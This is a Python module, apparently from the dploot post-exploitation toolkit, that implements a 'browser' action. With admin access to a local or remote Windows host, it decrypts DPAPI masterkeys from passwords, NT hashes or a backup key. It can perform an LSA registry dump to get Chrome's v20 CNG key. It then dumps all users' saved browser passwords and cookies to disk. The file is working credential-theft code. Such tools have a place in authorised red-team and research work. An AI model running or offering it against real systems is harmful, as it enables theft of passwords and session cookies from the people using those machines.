import argparse
import logging
from typing import Callable, Tuple
from dploot.action import DPLootAction
from dploot.action.masterkeys import add_user_masterkeys_argument_group
from dploot.lib.utils import dump_looted_files_to_disk
from dploot.triage.browser import BrowserTriage, Cookie
from dploot.triage.cng import CngTriage
from dploot.triage.masterkeys import MasterkeysTriage

NAME = "browser"


class BrowserAction(DPLootAction):
    def __init__(self, options: argparse.Namespace) -> None:
        super().init_triage_user(options)

    def run(self) -> None:
        super().run()
        if self.conn.is_admin():
            if self.masterkeys is None:

                def masterkey_triage(masterkey):
                    masterkey.dump()

                masterkeytriage = MasterkeysTriage(
                    target=self.target,
                    conn=self.conn,
                    pvkbytes=self.pvkbytes,
                    nthashes=self.nthashes,
                    passwords=self.passwords,
                    per_masterkey_callback=masterkey_triage
                    if not self.options.quiet
                    else None,
                )
                logging.info("Triage ALL USERS masterkeys\n")
                self.masterkeys = masterkeytriage.triage_masterkeys()
                if self.options.v20support:
                    self.masterkeys += masterkeytriage.triage_system_masterkeys()
                print()
                if self.outputdir is not None:
                    dump_looted_files_to_disk(self.outputdir, masterkeytriage.looted_files)

            def secret_callback(secret):
                if not self.options.show_cookies and isinstance(secret, Cookie):
                    return
                if self.options.quiet:
                    secret.dump_quiet()
                else:
                    secret.dump()

            cng_chromekey = None

            if self.options.v20support:
                triage = CngTriage(
                    target=self.target,
                    conn=self.conn,
                    masterkeys=self.masterkeys,
                )
                logging.info("Triage SYSTEM CNG files\n")

                for cng_file in triage.triage_system_cng():
                    if cng_file.cng_blob["Name"].decode("utf-16le").rstrip("\0") == "Google Chromekey1":
                            logging.info("Found CNG Google ChromeKey1\n")
                            cng_chromekey = cng_file.decrypted_private_key

            triage = BrowserTriage(
                target=self.target,
                conn=self.conn,
                masterkeys=self.masterkeys,
                per_secret_callback=secret_callback,
            )
            logging.info(
                "Triage Browser Credentials%sfor ALL USERS\n"
                % (" and Cookies " if self.options.show_cookies else " ")
            )
            triage.triage_browsers(
                gather_cookies=self.options.show_cookies,
                cng_chromekey=cng_chromekey,
                bypass_shared_violation=self.options.bypass_shared_violation,
            )
            if self.outputdir is not None:
                dump_looted_files_to_disk(self.outputdir, triage.looted_files)
        else:
            logging.info("Not an admin, exiting...")

def entry(options: argparse.Namespace) -> None:
    a = BrowserAction(options)
    a.run()

def add_subparser(subparsers: argparse._SubParsersAction, protocol: str) -> Tuple[str, Callable]:
    subparser = subparsers.add_parser(
        NAME,
        help="Dump users credentials and cookies saved in browser from local or remote target",
    )

    group = subparser.add_argument_group("browser options")

    group.add_argument(
        "--mkfile",
        action="store",
        help=("File containing {GUID}:SHA1 masterkeys mappings"),
    )

    add_user_masterkeys_argument_group(group)

    group.add_argument(
        "--show-cookies",
        action="store_true",
        help=("Output dumped cookies from browsers"),
    )

    group.add_argument(
        "--bypass-shared-violation",
        action="store_true",
        help=("Will try to bypass Shared Violation Error with a silly esentutl trick"),
    )

    group.add_argument(
        "--v20support",
        action="store_true",
        help=("Will dump v20 chromium credentials (will perform a LSA dump in form of reg save)"),
    )

    DPLootAction.add_general_args(subparser, protocol)

    return NAME, entry
